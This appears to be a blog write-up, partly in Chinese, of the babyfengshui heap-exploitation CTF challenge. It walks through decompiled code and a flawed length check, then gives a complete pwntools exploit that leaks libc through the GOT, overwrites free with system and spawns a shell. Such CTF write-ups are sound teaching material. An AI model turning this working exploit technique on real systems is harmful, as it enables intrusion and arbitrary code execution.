---
layout: post
title:  babyfengshui_33c3_2016
date:   2021-02-22 00:01:01 +0300
image:  2021-02-22-candle.jpg
tags:   [ctf,Pwn,ubuntu16,heap]
---

#### checksec

```assembly
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

#### main()

```assembly
void __cdecl __noreturn main()
{
  char v0; // [esp+3h] [ebp-15h]
  int v1; // [esp+4h] [ebp-14h]
  size_t v2; // [esp+8h] [ebp-10h]
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  alarm(0x14u);
  while ( 1 )
  {
    puts("0: Add a user");
    puts("1: Delete a user");
    puts("2: Display a user");
    puts("3: Update a user description");
    puts("4: Exit");
    printf("Action: ");
    if ( __isoc99_scanf("%d", &v1) == -1 )
      break;
    if ( !v1 )
    {
      printf("size of description: ");
      __isoc99_scanf("%u%c", &v2, &v0);
      add(v2);
    }
    if ( v1 == 1 )
    {
      printf("index: ");
      __isoc99_scanf("%d", &v2);
      delete(v2);
    }
    if ( v1 == 2 )
    {
      printf("index: ");
      __isoc99_scanf("%d", &v2);
      display(v2);
    }
    if ( v1 == 3 )
    {
      printf("index: ");
      __isoc99_scanf("%d", &v2);
      update(v2);
    }
    if ( v1 == 4 )
    {
      puts("Bye");
      exit(0);
    }
    if ( (unsigned __int8)byte_804B069 > 0x31u )
    {
      puts("maximum capacity exceeded, bye");
      exit(0);
    }
  }
  exit(1);
}
```

#### add()

```assembly
_DWORD *__cdecl add(size_t a1)
{
  void *s; // ST24_4
  _DWORD *v2; // ST28_4

  s = malloc(a1);
  memset(s, 0, a1);
  v2 = malloc(0x80u);
  memset(v2, 0, 0x80u);
  *v2 = s;
  ptr[(unsigned __int8)byte_804B069] = v2;
  printf("name: ");
  sub_80486BB((char *)ptr[(unsigned __int8)byte_804B069] + 4, 124);
  update(++byte_804B069 - 1);
  return v2;
}
```

每个user申请了两个块，先申请一个内容为description的堆块，再申请一个user结构体的堆块，user结构体中有保存了description的地址。

在申请description的堆块大小时，并没有将size存入user结构体。

#### delete()

```assembly
unsigned int __cdecl sub_8048905(unsigned __int8 a1)
{
  unsigned int v2; // [esp+1Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  if ( a1 < (unsigned __int8)byte_804B069 && ptr[a1] )
  {
    free(*(void **)ptr[a1]);
    free(ptr[a1]);
    ptr[a1] = 0;
  }
  return __readgsdword(0x14u) ^ v2;
}
```

检查空间是否存在，free掉user的description和user空间，并且指针置零。

#### display()

```assembly
unsigned int __cdecl sub_804898F(unsigned __int8 a1)
{
  unsigned int v2; // [esp+1Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  if ( a1 < (unsigned __int8)byte_804B069 && ptr[a1] )
  {
    printf("name: %s\n", (char *)ptr[a1] + 4);
    printf("description: %s\n", *(_DWORD *)ptr[a1]);
  }
  return __readgsdword(0x14u) ^ v2;
}
```

#### update()

```assembly
unsigned int __cdecl update(unsigned __int8 a1)
{
  char v2; // [esp+17h] [ebp-11h]
  int v3; // [esp+18h] [ebp-10h]
  unsigned int v4; // [esp+1Ch] [ebp-Ch]

  v4 = __readgsdword(0x14u);
  if ( a1 < (unsigned __int8)byte_804B069 && ptr[a1] )
  {
    v3 = 0;
    printf("text length: ");
    __isoc99_scanf("%u%c", &v3, &v2);
    if ( (char *)(v3 + *(_DWORD *)ptr[a1]) >= (char *)ptr[a1] - 4 )
    {
      puts("my l33t defenses cannot be fooled, cya!");
      exit(1);
    }
    printf("text: ");
    sub_80486BB(*(char **)ptr[a1], v3 + 1);
  }
  return __readgsdword(0x14u) ^ v4;
}
```

检查输入的size是否合法存在漏洞。程序的检查机制是将user结构体的起始地址➖user->description的起始地址作为了description的长度。而这两个堆块不一定是连续的，所以我们可以刻意使两个结构体地址不连续，从而可以使我们输入更长的payload。

#### exp:

```assembly
from pwn import *
from LibcSearcher import *

elf = ELF("./babyfengshui_33c3_2016")

# io = process("./babyfengshui_33c3_2016")

io = remote("node3.buuoj.cn", 26059)

def add(size, name, length, text):
    io.recvuntil("Action: ")
    io.sendline(str(0))
    io.recvuntil("size of description: ")
    io.sendline(str(size))
    io.recvuntil("name: ")
    io.sendline(name)
    io.recvuntil("text length: ")
    io.sendline(str(length))
    io.recvuntil("text: ")
    io.sendline(text)

def delete(index):
    io.recvuntil("Action: ")
    io.sendline(str(1))
    io.recvuntil("index: ")
    io.sendline(str(index))

def display(index):
    io.recvuntil("Action: ")
    io.sendline(str(2))
    io.recvuntil("index: ")
    io.sendline(str(index))

def update(index, length, text):
    io.recvuntil("Action: ")
    io.sendline(str(3))
    io.recvuntil("index: ")
    io.sendline(str(index))
    io.recvuntil("text length: ")
    io.sendline(str(length))
    io.recvuntil("text: ")
    io.sendline(text)

add(0x80, "0", 0x80, "aaaa")
add(0x80, "1", 0x80, "bbbb")
add(0x80, "2", 0x80, "/bin/sh\x00")
'''
0x80 user0->description
0x80 user0
0x80 user1->description
0x80 user1
0x80 user2->description
0x80 user2
'''
delete(0)
'''
0x80 empty (user0->description)
0x80 empty (user0)
0x80 user1->description
0x80 user1
0x80 user2->description
0x80 user2
'''
'''
0x8b84000:	0x0000011100000000	0xf7f957b0f7f957b0 description
0x8b84010:	0x0000000000000000	0x0000000000000000
0x8b84020:	0x0000000000000000	0x0000000000000000
0x8b84030:	0x0000000000000000	0x0000000000000000
0x8b84040:	0x0000000000000000	0x0000000000000000
0x8b84050:	0x0000000000000000	0x0000000000000000
0x8b84060:	0x0000000000000000	0x0000000000000000
0x8b84070:	0x0000000000000000	0x0000000000000000
0x8b84080:	0x0000000000000000	0x0000008800000088 user0
0x8b84090:	0x0000003008b84008	0x0000000000000000
0x8b840a0:	0x0000000000000000	0x0000000000000000
0x8b840b0:	0x0000000000000000	0x0000000000000000
0x8b840c0:	0x0000000000000000	0x0000000000000000
0x8b840d0:	0x0000000000000000	0x0000000000000000
0x8b840e0:	0x0000000000000000	0x0000000000000000
0x8b840f0:	0x0000000000000000	0x0000000000000000
0x8b84100:	0x0000000000000000	0x0000000000000000
0x8b84110:	0x0000008800000110	0x0000000062626262 description
0x8b84120:	0x0000000000000000	0x0000000000000000
0x8b84130:	0x0000000000000000	0x0000000000000000
0x8b84140:	0x0000000000000000	0x0000000000000000
0x8b84150:	0x0000000000000000	0x0000000000000000
0x8b84160:	0x0000000000000000	0x0000000000000000
0x8b84170:	0x0000000000000000	0x0000000000000000
0x8b84180:	0x0000000000000000	0x0000000000000000
0x8b84190:	0x0000000000000000	0x0000008900000000 user1
0x8b841a0:	0x0000003108b84118	0x0000000000000000
0x8b841b0:	0x0000000000000000	0x0000000000000000
0x8b841c0:	0x0000000000000000	0x0000000000000000
0x8b841d0:	0x0000000000000000	0x0000000000000000
0x8b841e0:	0x0000000000000000	0x0000000000000000
0x8b841f0:	0x0000000000000000	0x0000000000000000
0x8b84200:	0x0000000000000000	0x0000000000000000
0x8b84210:	0x0000000000000000	0x0000000000000000
0x8b84220:	0x0000008900000000	0x0068732f6e69622f description
0x8b84230:	0x000000000000000a	0x0000000000000000
0x8b84240:	0x0000000000000000	0x0000000000000000
0x8b84250:	0x0000000000000000	0x0000000000000000
0x8b84260:	0x0000000000000000	0x0000000000000000
0x8b84270:	0x0000000000000000	0x0000000000000000
0x8b84280:	0x0000000000000000	0x0000000000000000
0x8b84290:	0x0000000000000000	0x0000000000000000
0x8b842a0:	0x0000000000000000	0x0000008900000000 user2
0x8b842b0:	0x0000003208b84228	0x0000000000000000
0x8b842c0:	0x0000000000000000	0x0000000000000000
0x8b842d0:	0x0000000000000000	0x0000000000000000
0x8b842e0:	0x0000000000000000	0x0000000000000000
0x8b842f0:	0x0000000000000000	0x0000000000000000
0x8b84300:	0x0000000000000000	0x0000000000000000
0x8b84310:	0x0000000000000000	0x0000000000000000
0x8b84320:	0x0000000000000000	0x0000000000000000
'''

free_got = elf.got["free"]
add(0x100, "3", 0x19c, "c"*(0x80 + 0x8 + 0x80 + 0x8 + 0x80 + 0x8) + p32(free_got))
display(1)

io.recvuntil("description: ")
addr = u32(io.recv(4))
print(hex(addr))

libc = LibcSearcher("free", addr)
base = addr - libc.dump("free")
system = base + libc.dump("system")

update(1, 0x4, p32(system))

# execute free()
delete(2)

io.interactive()
```

